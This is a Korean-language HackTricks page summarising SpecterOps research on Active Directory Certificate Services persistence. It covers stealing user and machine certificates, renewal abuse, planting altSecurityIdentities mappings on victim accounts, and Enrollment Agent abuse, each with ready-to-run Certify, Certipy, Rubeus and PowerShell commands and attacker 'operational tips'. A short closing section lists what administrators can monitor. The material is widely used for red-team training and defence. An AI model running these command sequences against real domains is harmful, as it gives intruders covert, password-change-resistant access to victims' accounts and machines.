# AD CS 계정 지속성

{{#include ../../../banners/hacktricks-training.md}}

**이 문서는 [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) 연구의 계정 지속성 챕터를 간단히 요약한 것입니다**

## 인증서로 인한 Active User Credential Theft 이해 – PERSIST1

사용자가 도메인 인증을 허용하는 인증서를 요청할 수 있는 시나리오에서는 공격자가 해당 인증서를 요청해 탈취함으로써 네트워크에서 지속성을 유지할 기회를 갖게 됩니다. 기본적으로 Active Directory의 `User` 템플릿은 이러한 요청을 허용하지만, 경우에 따라 비활성화되어 있을 수 있습니다.

[Certify](https://github.com/GhostPack/Certify) 또는 [Certipy](https://github.com/ly4k/Certipy)를 사용하면 클라이언트 인증을 허용하는 활성화된 템플릿을 검색한 다음 하나를 요청할 수 있습니다:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
인증서의 힘은 인증서가 유효한 한, 비밀번호가 변경되더라도 그 인증서가 속한 사용자로서 인증할 수 있는 능력에 있다.

PEM을 PFX로 변환한 다음 이를 사용해 TGT를 얻을 수 있다:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 참고: 다른 기법들과 결합하면 (THEFT 섹션 참조), 인증서 기반 인증은 LSASS를 건드리지 않고도 권한 상승되지 않은 컨텍스트에서도 지속적인 접근을 허용합니다.

## 인증서를 통한 Machine 지속성 획득 - PERSIST2

공격자가 호스트에서 권한 상승을 가지고 있다면, 기본 `Machine` 템플릿을 사용하여 손상된 시스템의 머신 계정에 대해 인증서를 등록할 수 있습니다. 머신으로 인증하면 로컬 서비스에 대해 S4U2Self를 사용할 수 있게 되며 영구적인 호스트 지속성을 제공할 수 있습니다:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 인증서 갱신을 통한 Persistence 확장 - PERSIST3

인증서 템플릿의 유효 기간과 갱신 기간을 악용하면 공격자가 장기적인 접근을 유지할 수 있습니다. 이전에 발급된 인증서와 해당 개인 키를 보유하고 있다면, 만료 전에 갱신하여 원래 주체에 연결된 추가 요청 흔적 없이 새롭고 장기간 유효한 자격 증명을 얻을 수 있습니다.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 운영 팁: 공격자가 보유한 PFX 파일의 수명을 추적하고 조기에 갱신하세요. 갱신은 또한 업데이트된 인증서가 최신 SID 매핑 확장을 포함하게 하여 더 엄격한 DC 매핑 규칙 하에서도 계속 사용할 수 있게 할 수 있습니다(다음 섹션 참조).

## 명시적 인증서 매핑 (altSecurityIdentities) – PERSIST4

대상 계정의 `altSecurityIdentities` 속성에 쓸 수 있다면, 공격자가 제어하는 인증서를 해당 계정에 명시적으로 매핑할 수 있습니다. 이는 비밀번호 변경 후에도 유지되며, 강력한 매핑 형식을 사용하면 최신 DC 강제 적용 하에서도 동작을 유지합니다.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
그런 다음 PFX로 인증하세요. Certipy는 TGT를 직접 획득합니다:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 강력한 `altSecurityIdentities` 매핑 구축

실무적으로, **Issuer+Serial** 및 **SKI** 매핑은 공격자가 보유한 인증서로부터 구축하기 가장 쉬운 강력한 형식입니다. 이는 **February 11, 2025** 이후에 중요합니다. DCs가 기본적으로 **Full Enforcement**로 전환되면서 약한 매핑은 더 이상 신뢰할 수 없게 되기 때문입니다.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- 강력한 매핑 타입만 사용하세요: `X509IssuerSerialNumber`, `X509SKI`, 또는 `X509SHA1PublicKey`. 약한 포맷(Subject/Issuer, Subject-only, RFC822 email)은 더 이상 권장되지 않으며 DC 정책으로 차단될 수 있습니다.
- 매핑은 **user** 및 **computer** 객체 모두에 작동하므로 컴퓨터 계정의 `altSecurityIdentities`에 대한 쓰기 권한만 있어도 해당 머신으로 지속화할 수 있습니다.
- 인증서 체인은 DC가 신뢰하는 루트까지 구성되어야 합니다. NTAuth의 Enterprise CAs는 일반적으로 신뢰되며, 일부 환경에서는 public CAs도 신뢰합니다.
- DC에 Smart Card Logon EKU가 없거나 `KDC_ERR_PADATA_TYPE_NOSUPP`를 반환해 PKINIT이 실패할 때에도 Schannel 인증은 지속성 확보에 유용합니다.

약한 명시적 매핑과 공격 경로에 대한 자세한 내용은 다음을 참조하세요:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

유효한 Certificate Request Agent/Enrollment Agent certificate를 획득하면 사용자를 대신해 로그온 가능한 새로운 인증서를 자유롭게 발급할 수 있으며, 에이전트 PFX를 오프라인에 보관해 지속성 토큰으로 사용할 수 있습니다. 악용 워크플로우:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
이 persistence를 제거하려면 에이전트 인증서 또는 템플릿 권한의 폐기가 필요합니다.

Operational notes
- 최신 `Certipy` 버전은 `-on-behalf-of`와 `-renew`를 모두 지원하므로, Enrollment Agent PFX를 보유한 공격자는 원래 대상 계정을 다시 건드리지 않고도 leaf certificates를 발급하고 이후 갱신할 수 있습니다.
- PKINIT 기반 TGT 획득이 불가능한 경우에도, 생성된 on-behalf-of certificate는 `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`로 Schannel authentication에 여전히 사용할 수 있습니다.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754는 도메인 컨트롤러에 Strong Certificate Mapping Enforcement를 도입했습니다. 2025년 2월 11일부터 DC는 기본적으로 Full Enforcement로 설정되어 약하거나 모호한 매핑을 거부합니다. 실무적 의미:

- SID mapping extension이 없는 Pre-2022 certificates는 DC가 Full Enforcement일 때 암시적 매핑에 실패할 수 있습니다. 공격자는 AD CS를 통해 인증서를 갱신하여 SID mapping extension을 얻거나 `altSecurityIdentities`에 강력한 explicit mapping(PERSIST4)을 심어 접근을 유지할 수 있습니다.
- Issuer+Serial, SKI, SHA1-PublicKey 같은 강한 포맷을 사용하는 explicit mappings는 계속 동작합니다. Issuer/Subject, Subject-only, RFC822 같은 약한 포맷은 차단될 수 있으므로 persistence 용도로는 피해야 합니다.

관리자는 다음에 대해 모니터링 및 경보를 설정해야 합니다:
- `altSecurityIdentities` 변경 및 Enrollment Agent 및 User certificates의 발급/갱신
- on-behalf-of 요청 및 비정상적인 갱신 패턴에 대한 CA 발급 로그

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
